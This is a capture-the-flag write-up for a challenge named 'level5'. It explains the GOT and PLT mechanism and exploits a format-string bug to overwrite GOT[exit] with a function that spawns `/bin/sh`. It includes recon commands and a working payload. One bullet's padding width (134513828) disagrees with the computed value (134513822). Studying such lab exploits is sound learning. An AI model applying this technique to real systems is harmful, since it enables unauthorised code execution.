# level5 — Format String + GOT Overwrite
 
## Vulnerability

`n()` passes user input directly to `printf()` without a format string → **Format String vulnerability**.  
`exit()` is called at the end → we **overwrite GOT[exit]** to redirect it to `o()` which calls `system("/bin/sh")`.

---

## Dynamic libraries and the GOT

### Dynamic libraries

A dynamic library (`.so` on Linux) is compiled code that lives in a separate file and is **shared between all processes** that use it. libc (`libc.so.6`) is the classic example — every C program calls `printf`, `exit`, etc., but instead of copying those functions into every binary, the OS maps a single copy of libc into each process's address space at load time.

Because ASLR randomises where that mapping lands, the binary cannot know the final address of `exit` at compile time. It needs a level of indirection.

### The GOT (Global Offset Table)

The GOT is a writable table in the binary's own data segment. Each external function gets one slot:

```
GOT[exit]   → (filled by the dynamic linker at load time with the real address of exit in libc)
GOT[printf] → ...
GOT[fgets]  → ...
```

Every call to `exit()` in the code actually goes through the **PLT** (Procedure Linkage Table), a small stub:

```asm
exit@plt:
    jmp *GOT[exit]      ; jump to whatever address is stored in the GOT slot
    push <reloc index>  ; (only reached on first call — triggers lazy binding)
    jmp  _dl_resolve
```

On the first call the dynamic linker resolves the real address and writes it into `GOT[exit]`. From then on the slot always holds the real libc address.

### Why this is exploitable

The GOT lives in a **writable** data segment. If we can write an arbitrary value into `GOT[exit]`, the next `exit()` call will jump to our chosen address instead of libc's `exit`. Here we overwrite it with the address of `o()` — a function already in the binary that calls `system("/bin/sh")`.

```
exit(1)  →  jmp *GOT[exit]  →  (we wrote &o() there)  →  o()  →  system("/bin/sh")
```

---

## Recon
 
```bash
# Find GOT address of exit
objdump -R level5 | grep exit
# 08049838 R_386_JUMP_SLOT   exit
 
# Find printf stack offset (look for 41414141)
echo "AAAA %x %x %x %x %x %x %x %x" | ./level5
# AAAA 200 b7fd1ac0 b7ff37d0 41414141 ...
# offset = 4
```
 
## Exploit

Target: write `0x080484a4` = **134513828** (address of `o()`) into `0x08049838` (GOT[exit]).

Our input sits at **position 4** on the stack (confirmed in Recon). We plant the GOT address at the very start of the payload so `%4$n` will write into it.

Byte count when `%4$n` fires:
- `\x38\x98\x04\x08` → 4 bytes (the address itself)
- `_` → 1 byte
- `%.134513828x` → 134513828 bytes (width padding on a dummy stack value)
- `_` → 1 byte

We need `printf` to have written exactly **134513828** bytes, so:

```
padding = 0x080484a4 − 4 (addr) − 1 (_) − 1 (_) = 134513822
```

```bash
python -c "print('\x38\x98\x04\x08' + '_%.134513822x_%4\$n')" > /tmp/exploit
cat /tmp/exploit - | ./level5
```
 
## Flow
 
```
printf(buf)  →  overwrites GOT[exit] with &o()
exit(1)      →  jumps to o()
o()          →  system("/bin/sh")  →  SHELL
```
 
